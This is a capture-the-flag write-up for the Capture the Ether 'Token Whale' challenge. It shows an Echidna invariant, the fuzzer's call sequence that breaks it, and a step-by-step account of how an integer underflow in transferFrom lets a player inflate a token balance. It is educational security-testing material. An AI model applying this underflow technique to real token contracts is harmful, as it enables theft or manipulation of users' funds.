## Token Whale Capture the Ether challenge and Echidna

### Challenge
The Token Whale contracts is an ERC20-compatible hard to acquire token. There’s a fixed supply of 1,000 tokens, all of which are user's to start with. Find a way to accumulate at least 1,000,000 tokens to solve this challenge.

### What was it testing?
The specific invariant being checked was the player's balance. In order to break the CTF we needed to violate the condition of a user's balance limit of 1,000,000, therefore this was the function:
```
    function echidna_isCompleted() public view returns (bool) {

        return balanceOf[player] <= 1000000;
    }
```

### Echidna results
The tool found this path to achieve the condition violation:
```
Call sequence:
   approve(0x20000,167133266616215219087984434971341992939411184825004473792248855581927478929) from: 0x0000000000000000000000000000000000030000 Time delay: 440097 seconds Block delay: 127
   transferFrom(0x30000,0xffffffff,671) from: 0x0000000000000000000000000000000000020000 Time delay: 355645 seconds Block delay: 32767
   transfer(0x10000,115792089237316195423570985008687907853269984665640564039457584007913129638936) from: 0x0000000000000000000000000000000000020000 Time delay: 297507 seconds Block delay:    
   transfer(0x30000,71834082248646112960033315906464535836812324211014610942410955687412905560741) from: 0x0000000000000000000000000000000000010000 Time delay: 358061 seconds Block delay: 33200
```

### Results interpretation
The real trick to solve this challenge is to underflow an user's balance by performing a transfer that will execute `balanceOf[msg.sender] -= value;`. To better understand echidna results let's remember this function signatures: `approve(address spender, uint256 value)`, `transferFrom(address from, address to, uint256 value)`, and `transfer(address to, uint256 value)`. Let's go through the calls:

1. The approve function doesnt require the approved value to be less than the actual balance, that's why the caller could make that `approve` call with such a large number.(msg.sender in this tx: address(3))
2. Since address(2) has an allowance by address(3) it can can bypass the requires, but when `transferFrom` calls `_transfer` it doesnt subtract from the `from` parameter sent to `transferFrom` but from the msg.sender's balance effectively underflowing.
3. address(2) transfers a big amount to address(1).
4. address(1) is able to transfer a big amount to address(3).

